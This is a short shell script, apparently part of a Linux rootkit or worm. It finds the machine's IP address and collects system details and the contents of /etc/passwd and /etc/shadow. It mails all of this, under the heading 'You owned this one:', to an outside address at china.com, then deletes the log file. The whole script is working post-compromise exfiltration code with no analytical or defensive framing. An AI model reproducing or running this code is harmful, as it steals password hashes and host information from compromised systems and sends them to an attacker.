#!/bin/sh
PATH="/usr/bin:/bin:/usr/local/bin/:/usr/sbin/:/sbin"
export PATH

route -n | while read A
do

GW=`echo $A | awk '{printf("%s",$1)}'`

if [ $GW = "0.0.0.0" ]
then

IFACE=`echo $A | awk '{printf("%s",$8)}'`

ifconfig $IFACE | while read B
     do
      CMP=`echo $B | awk '{printf("%s",$1)}'`
      if [ $CMP = "inet" ]
         then
         MYIP=`echo $B | cut -d: -f 2 | awk '{printf("%s",$1)}'`
        # echo "my default iface is $IFACE and my ip is $MYIP"
         echo $MYIP > myip
         exit
      fi
   done

fi
done

echo You owned this one: > mail.log
cat myip >> mail.log
echo name: >> mail.log
uname -a >> mail.log
echo network: >> mail.log
/sbin/ifconfig -a >> mail.log
echo passwd: >> mail.log
cat /etc/passwd >> mail.log
echo shadow: >> mail.log
cat /etc/shadow >> mail.log

mail -s `cat myip` 1i0nkit@china.com < mail.log
rm -rf mail.log
